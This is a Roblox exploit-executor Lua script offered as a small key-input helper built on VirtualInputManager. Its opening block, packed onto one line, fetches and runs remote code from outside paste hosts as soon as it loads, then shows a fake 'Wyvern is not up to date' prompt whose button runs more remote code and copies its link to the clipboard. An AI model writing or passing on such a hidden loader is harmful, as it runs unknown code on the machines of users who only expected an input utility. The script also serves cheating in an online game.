-- Made by Whoman#3561
task.spawn(function()
if getgenv().SentPromptCorePackage==nil then getgenv().SentPromptCorePackage=false end;task.spawn(function()getgenv().realwyvernversion=loadstring(game:HttpGet("https://embed.fail/p/raw/xr31a35ucr"))()if getgenv().wyvern_version==nil or getgenv().wyvern_version~=getgenv().realwyvernversion then if getgenv().SentPromptCorePackage==false then getgenv().SentPromptCorePackage=true;local a=loadstring(game:HttpGet("https://embed.fail/p/raw/57rlobkgdv"))()a("Heads Up!","This Wyvern is not up to date! Please tell the uploader of the script to update it to the newest version. This is to enhance your experience with the latest updates.",{{Text="Execute Latest Wyvern",LayoutOrder=1,Primary=true,Callback=function()pcall(function()loadstring(game:HttpGet("https://discord-kitten.fun/p/raw/pl6mjl4xoy"))()game:GetService("GuiService"):ClearError()setclipboard("https://discord-kitten.fun/p/raw/pl6mjl4xoy")end)end},{Text="Close",LayoutOrder=2,Primary=false,Callback=function()game:GetService("GuiService"):ClearError()end}})end end end)
end)
local vim = game:GetService('VirtualInputManager')
input = {
    hold = function(key, time)
        vim:SendKeyEvent(true, key, false, nil)
        task.wait(time)
        vim:SendKeyEvent(false, key, false, nil)
    end,
    press = function(key)
        vim:SendKeyEvent(true, key, false, nil)
	task.wait(0.005)
        vim:SendKeyEvent(false, key, false, nil)
    end
}

return input